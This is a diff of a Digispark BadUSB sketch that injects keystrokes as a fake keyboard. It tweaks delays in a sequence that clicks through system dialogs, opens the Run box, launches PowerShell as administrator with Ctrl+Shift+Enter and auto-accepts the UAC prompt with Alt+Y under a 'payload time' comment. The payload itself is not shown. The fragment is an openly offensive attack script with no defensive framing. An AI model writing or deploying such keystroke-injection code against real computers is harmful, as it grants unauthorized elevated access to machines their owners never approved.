@@ -19,7 +19,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(2000);
+  DigiKeyboard.delay(5000);
   DigiKeyboard.write('\t');
   DigiKeyboard.delay(300);
   DigiKeyboard.write('\t');
@@ -31,7 +31,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(750);
   DigiKeyboard.sendKeyStroke(KEY_SPACE);
-  DigiKeyboard.delay(500);
+  DigiKeyboard.delay(1500);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(500);
 
@@ -45,12 +45,12 @@ void loop() {
 
   //payload time
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print(F("powershell"));
   DigiKeyboard.delay(500);
+  DigiKeyboard.print(F("powershell"));
+  DigiKeyboard.delay(250);
 
   DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(1500);
 
   //
   
@@ -60,7 +60,7 @@ void loop() {
 //  DigiKeyboard.delay(1000);
 //  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   
-  // ^^ instead of this bad code above, I changed it to ctrl+shift+enter ^^
+  // ^^ instead of this bad code above, I changed it to ctrl+sahift+enter ^^
 
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(750);
